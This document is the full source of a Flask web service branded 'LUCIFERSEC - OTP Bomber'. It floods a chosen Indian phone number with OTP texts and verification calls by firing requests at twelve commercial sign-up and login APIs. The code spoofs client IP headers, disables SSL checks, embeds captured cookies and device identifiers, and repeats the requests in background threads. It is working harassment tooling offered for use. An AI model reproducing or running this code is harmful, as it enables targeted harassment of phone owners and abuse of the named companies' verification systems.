from flask import Flask, request, jsonify, render_template
import aiohttp
import asyncio
import json
import urllib.parse
import time
from datetime import datetime
import threading

app = Flask(__name__)

# Global variables to track usage
total_requests_sent = 0
api_usage_count = {}
bombing_sessions = []

class BombingSession:
    def __init__(self, phone, ip, iterations):
        self.phone = phone
        self.ip = ip
        self.iterations = iterations
        self.start_time = datetime.now()
        self.status = "running"
        self.logs = []
        self.results = {
            "successful": 0,
            "failed": 0,
            "total": 0
        }
    
    def add_log(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] {message}"
        self.logs.append(log_entry)
        print(log_entry)

# Context processor to make 'now' available in all templates
@app.context_processor
def inject_now():
    return {'now': datetime.now}

async def send_request(session, api, phone_number, ip_address, bombing_session):
    global total_requests_sent
    try:
        if api["method"] == "POST":
            if api["headers"].get("Content-Type", "").startswith("application/x-www-form-urlencoded"):
                # Handle form-urlencoded data
                payload = api["payload"].copy()
                # Replace phone number placeholder
                for key, value in payload.items():
                    if isinstance(value, str) and "{{PHONE}}" in value:
                        payload[key] = value.replace("{{PHONE}}", phone_number)
                
                payload_str = "&".join(f"{k}={urllib.parse.quote(str(v))}" for k, v in payload.items())
                api["headers"]["Content-Length"] = str(len(payload_str.encode('utf-8')))
                async with session.post(api["endpoint"], data=payload_str, headers=api["headers"], timeout=10, ssl=False) as response:
                    status_code = response.status
            else:
                # Handle JSON data
                payload = api["payload"].copy()
                # Replace phone number placeholder
                for key, value in payload.items():
                    if isinstance(value, str) and "{{PHONE}}" in value:
                        payload[key] = value.replace("{{PHONE}}", phone_number)
                
                async with session.post(api["endpoint"], json=payload, headers=api["headers"], timeout=10, ssl=False) as response:
                    status_code = response.status
        else:
            bombing_session.add_log(f"Unsupported method {api['method']} for {api['endpoint']}")
            return None, api
        
        total_requests_sent += 1
        
        # Track API usage
        if api["endpoint"] not in api_usage_count:
            api_usage_count[api["endpoint"]] = 0
        api_usage_count[api["endpoint"]] += 1
        
        bombing_session.add_log(f"Request to {api['name']} - Status: {status_code}")
        return status_code, api
        
    except (aiohttp.ClientError, asyncio.TimeoutError) as e:
        bombing_session.add_log(f"Error sending request to {api['name']}: {str(e)[:100]}...")
        return None, api
    except Exception as e:
        bombing_session.add_log(f"Unexpected error with {api['name']}: {str(e)[:100]}...")
        return None, api

async def send_otp_requests(phone_number, ip_address, iterations=1, bombing_session=None):
    # Complete list of 12 APIs
    apis = [
        {
            "name": "Hungama Communication",
            "endpoint": "https://communication.api.hungama.com/v1/communication/otp",
            "method": "POST",
            "payload": {
                "mobileNo": "{{PHONE}}",
                "countryCode": "+91",
                "appCode": "un",
                "messageId": "1",
                "emailId": "",
                "subject": "Register",
                "priority": "1",
                "device": "web",
                "variant": "v1",
                "templateCode": 1
            },
            "headers": {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Content-Type": "application/json",
                "identifier": "home",
                "mlang": "en",
                "sec-ch-ua-platform": "\"Android\"",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "sec-ch-ua-mobile": "?1",
                "alang": "en",
                "country_code": "IN",
                "vlang": "en",
                "origin": "https://www.hungama.com",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.hungama.com/",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "priority": "u=1, i",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "name": "Meru Cab",
            "endpoint": "https://merucabapp.com/api/otp/generate",
            "method": "POST",
            "payload": {"mobile_number": "{{PHONE}}"},
            "headers": {
                "Mobilenumber": "{{PHONE}}",
                "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
                "Oauthtoken": "",
                "AppVersion": "245",
                "ApiVersion": "6.2.55",
                "DeviceType": "Android",
                "DeviceId": "44098bdebb2dc047",
                "Content-Type": "application/x-www-form-urlencoded",
                "Host": "merucabapp.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/4.9.0",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "name": "Dayco India",
            "endpoint": "https://ekyc.daycoindia.com/api/nscript_functions.php",
            "method": "POST",
            "payload": {"api": "send_otp", "brand": "dayco", "mob": "{{PHONE}}", "resend_otp": "resend_otp"},
            "headers": {
                "Host": "ekyc.daycoindia.com",
                "sec-ch-ua-platform": "\"Android\"",
                "X-Requested-With": "XMLHttpRequest",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "sec-ch-ua-mobile": "?1",
                "Origin": "https://ekyc.daycoindia.com",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://ekyc.daycoindia.com/verify_otp.php",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "Cookie": "_ga_E8YSD34SG2=GS1.1.1745236629.1.0.1745236629.60.0.0; _ga=GA1.1.1156483287.1745236629; _clck=hy49vg%7C2%7Cfv9%7C0%7C1937; PHPSESSID=tbt45qc065ng0cotka6aql88sm; _clsk=1oia3yt%7C1745236688928%7C3%7C1%7Cu.clarity.ms%2Fcollect",
                "Priority": "u=1, i",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "name": "Doubtnut",
            "endpoint": "https://api.doubtnut.com/v4/student/login",
            "method": "POST",
            "payload": {
                "app_version": "7.10.51",
                "aaid": "538bd3a8-09c3-47fa-9141-6203f4c89450",
                "course": "",
                "phone_number": "{{PHONE}}",
                "language": "en",
                "udid": "b751fb63c0ae17ba",
                "class": "",
                "gcm_reg_id": "eyZcYS-rT_i4aqYVzlSnBq:APA91bEsUXZ9BeWjN2cFFNP_Sy30-kNIvOUoEZgUWPgxI9svGS6MlrzZxwbp5FD6dFqUROZTqaaEoLm8aLe35Y-ZUfNtP4VluS7D76HFWQ0dglKpIQ3lKvw"
            },
            "headers": {
                "version_code": "1160",
                "has_upi": "false",
                "device_model": "ASUS_I005DA",
                "android_sdk_version": "28",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/5.0.0-alpha.2",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "name": "NoBroker",
            "endpoint": "https://www.nobroker.in/api/v3/account/otp/send",
            "method": "POST",
            "payload": {"phone": "{{PHONE}}", "countryCode": "IN"},
            "headers": {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Content-Type": "application/x-www-form-urlencoded",
                "sec-ch-ua-platform": "Android",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "sec-ch-ua-mobile": "?1",
                "baggage": "sentry-environment=production,sentry-release=02102023,sentry-public_key=826f347c1aa641b6a323678bf8f6290b,sentry-trace_id=2a1cf434a30d4d3189d50a0751921996",
                "sentry-trace": "2a1cf434a30d4d3189d50a0751921996-9a2517ad5ff86454",
                "origin": "https://www.nobroker.in",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.nobroker.in/",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "priority": "u=1, i",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "name": "Shiprocket",
            "endpoint": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
            "method": "POST",
            "payload": {"mobileNumber": "{{PHONE}}"},
            "headers": {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "Accept": "application/json",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Content-Type": "application/json",
                "sec-ch-ua-platform": "Android",
                "authorization": "Bearer null",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "sec-ch-ua-mobile": "?1",
                "origin": "https://app.shiprocket.in",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://app.shiprocket.in/",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "priority": "u=1, i",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "name": "Tata Capital",
            "endpoint": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
            "method": "POST",
            "payload": {"phone": "{{PHONE}}", "applSource": "", "isOtpViaCallAtLogin": "true"},
            "headers": {
                "Content-Type": "application/json",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "name": "PenPencil",
            "endpoint": "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
            "method": "POST",
            "payload": {"organizationId": "5eb393ee95fab7468a79d189", "mobile": "{{PHONE}}"},
            "headers": {
                "Host": "api.penpencil.co",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/3.9.1",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "name": "1MG",
            "endpoint": "https://www.1mg.com/auth_api/v6/create_token",
            "method": "POST",
            "payload": {"number": "{{PHONE}}", "is_corporate_user": False, "otp_on_call": True},
            "headers": {
                "Host": "www.1mg.com",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/3.9.1",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "name": "Swiggy",
            "endpoint": "https://profile.swiggy.com/api/v3/app/request_call_verification",
            "method": "POST",
            "payload": {"mobile": "{{PHONE}}"},
            "headers": {
                "Host": "profile.swiggy.com",
                "tracestate": "@nr=0-2-737486-14933469-25139d3d045e42ba----1692101455751",
                "traceparent": "00-9d2eef48a5b94caea992b7a54c3449d6-25139d3d045e42ba-00",
                "newrelic": "eyJ2IjpbMC,yXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiNzM3NDg2IiwiYXAiOiIxNDkzMzQ2OSIsInRyIjoiOWQyZWVmNDhhNWI5ZDYiLCJpZCI6IjI1MTM5ZDNkMDQ1ZTQyYmEiLCJ0aSI6MTY5MjEwMTQ1NTc1MX19",
                "pl-version": "55",
                "user-agent": "Swiggy-Android",
                "tid": "e5fe04cb-a273-47f8-9d18-9abd33c7f7f6",
                "sid": "8rt48da5-f9d8-4cb8-9e01-8a3b18e01f1c",
                "version-code": "1161",
                "app-version": "4.38.1",
                "latitude": "0.0",
                "longitude": "0.0",
                "os-version": "13",
                "accessibility_enabled": "false",
                "swuid": "4c27ae3a76b146f3",
                "deviceid": "4c27ae3a76b146f3",
                "x-network-quality": "GOOD",
                "accept-encoding": "gzip",
                "accept": "application/json; charset=utf-8",
                "content-type": "application/json; charset=utf-8",
                "x-newrelic-id": "UwUAVV5VGwIEXVJRAwcO",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "name": "KPN Fresh",
            "endpoint": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
            "method": "POST",
            "payload": {"phone_number": {"number": "{{PHONE}}", "country_code": "+91"}},
            "headers": {
                "Host": "api.kpnfresh.com",
                "sec-ch-ua-platform": "\"Android\"",
                "cache": "no-store",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "x-channel-id": "WEB",
                "sec-ch-ua-mobile": "?1",
                "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "content-type": "application/json",
                "x-user-journey-id": "2fbdb12b-feb8-40f5-9fc7-7ce4660723ae",
                "accept": "*/*",
                "origin": "https://www.kpnfresh.com",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.kpnfresh.com/",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                "priority": "u=1, i",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "name": "Servetel",
            "endpoint": "https://api.servetel.in/v1/auth/otp",
            "method": "POST",
            "payload": {"mobile_number": "{{PHONE}}"},
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B Build/TP1A.220624.014)",
                "Host": "api.servetel.in",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        }
    ]

    bombing_session.add_log(f"🚀 Starting OTP bomber for: {phone_number}")
    bombing_session.add_log(f"📡 Using {len(apis)} premium APIs")
    bombing_session.add_log(f"🔄 Iterations: {iterations}")
    
    results = []
    successful_requests = 0
    failed_requests = 0
    
    async with aiohttp.ClientSession() as session:
        try:
            for iteration in range(iterations):
                bombing_session.add_log(f"🔄 Starting iteration {iteration + 1}/{iterations}")
                tasks = [send_request(session, api, phone_number, ip_address, bombing_session) for api in apis]
                batch_results = await asyncio.gather(*tasks, return_exceptions=True)
                
                new_apis = []
                for result in batch_results:
                    if isinstance(result, Exception):
                        failed_requests += 1
                        bombing_session.results["failed"] += 1
                        continue
                        
                    status_code, api = result
                    if status_code and status_code in [200, 201]:
                        new_apis.append(api)
                        successful_requests += 1
                        bombing_session.results["successful"] += 1
                        bombing_session.add_log(f"✅ {api['name']} - Success (Status: {status_code})")
                    elif status_code is not None:
                        failed_requests += 1
                        bombing_session.results["failed"] += 1
                        bombing_session.add_log(f"❌ {api['name']} - Failed (Status: {status_code})")
                    else:
                        failed_requests += 1
                        bombing_session.results["failed"] += 1
                        bombing_session.add_log(f"⚠️ {api['name']} - Error (Timeout/Network)")
                
                apis = new_apis
                bombing_session.results["total"] = successful_requests + failed_requests
                
                if not apis:
                    bombing_session.add_log("🛑 All APIs have been exhausted")
                    break
                    
                if iteration < iterations - 1:
                    bombing_session.add_log("⏳ Waiting 1 second before next iteration...")
                    await asyncio.sleep(1)

        except Exception as e:
            bombing_session.add_log(f"💥 Critical error: {e}")
            bombing_session.status = "failed"
            return {"error": str(e)}

    bombing_session.add_log(f"🎉 Bombing completed! Successful: {successful_requests}, Failed: {failed_requests}")
    bombing_session.status = "completed"
    
    return {
        "success": True,
        "message": f"OTP bombing completed for {phone_number}",
        "phone_number": phone_number,
        "ip_address": ip_address,
        "total_iterations": iterations,
        "total_requests": successful_requests + failed_requests,
        "successful_requests": successful_requests,
        "failed_requests": failed_requests,
        "success_rate": f"{(successful_requests/(successful_requests + failed_requests))*100:.2f}%" if (successful_requests + failed_requests) > 0 else "0%"
    }

def run_async_bombing(phone_number, ip_address, iterations, bombing_session):
    """Run async bombing in a separate thread"""
    asyncio.run(send_otp_requests(phone_number, ip_address, iterations, bombing_session))

# Routes
@app.route('/')
def home():
    return render_template('index.html')

@app.route('/bomber')
def bomber():
    return render_template('bomber.html')

@app.route('/stats')
def stats():
    return render_template('stats.html')

@app.route('/apis')
def apis():
    return render_template('apis.html')

@app.route('/api/bomb', methods=['POST'])
def bomb_otp():
    data = request.get_json()
    phone_number = data.get('phone', '').strip()
    ip_address = data.get('ip', '192.168.1.1').strip()
    iterations = int(data.get('iterations', 1))
    
    if not phone_number:
        return jsonify({
            "success": False,
            "error": "Phone number is required"
        }), 400
    
    if not phone_number.isdigit() or len(phone_number) != 10:
        return jsonify({
            "success": False,
            "error": "Invalid phone number! Please enter a 10-digit number."
        }), 400
    
    if iterations > 5:
        iterations = 5
    
    # Create new bombing session
    session = BombingSession(phone_number, ip_address, iterations)
    bombing_sessions.append(session)
    session_id = len(bombing_sessions) - 1
    
    try:
        # Run bombing in background thread
        thread = threading.Thread(target=run_async_bombing, args=(phone_number, ip_address, iterations, session))
        thread.daemon = True
        thread.start()
        
        return jsonify({
            "success": True,
            "message": "OTP bombing started successfully",
            "session_id": session_id,
            "phone_number": phone_number
        })
    except Exception as e:
        session.status = "failed"
        session.add_log(f"Server error: {e}")
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500

@app.route('/api/session/<int:session_id>')
def get_session(session_id):
    if 0 <= session_id < len(bombing_sessions):
        session = bombing_sessions[session_id]
        return jsonify({
            "phone": session.phone,
            "status": session.status,
            "logs": session.logs[-50:],  # Last 50 logs
            "results": session.results,
            "start_time": session.start_time.isoformat(),
            "duration": str(datetime.now() - session.start_time)
        })
    return jsonify({"error": "Session not found"}), 404

@app.route('/api/stats')
def get_stats():
    return jsonify({
        "total_requests_sent": total_requests_sent,
        "total_unique_apis": len(api_usage_count),
        "api_usage_stats": api_usage_count,
        "active_sessions": len([s for s in bombing_sessions if s.status == "running"]),
        "total_sessions": len(bombing_sessions),
        "server_time": datetime.now().isoformat()
    })

@app.route('/api/apis')
def get_apis_list():
    apis_list = [
        "Hungama Communication API",
        "Meru Cab OTP API", 
        "Dayco India EKYC API",
        "Doubtnut Student Login API",
        "NoBroker OTP API",
        "Shiprocket Auth API",
        "Tata Capital OTP API",
        "PenPencil OTP API",
        "1MG Auth API",
        "Swiggy Call Verification API",
        "KPN Fresh OTP API",
        "Servetel Auth API"
    ]
    return jsonify({
        "total_apis": len(apis_list),
        "apis": apis_list
    })

if __name__ == '__main__':
    print("🚀 LUCIFERSEC - OTP Bomber API Starting...")
    print("📍 Server running on http://localhost:5000")
    print("⚡ Powered by Advanced Asynchronous Technology")
    app.run(debug=True, host='0.0.0.0', port=5000)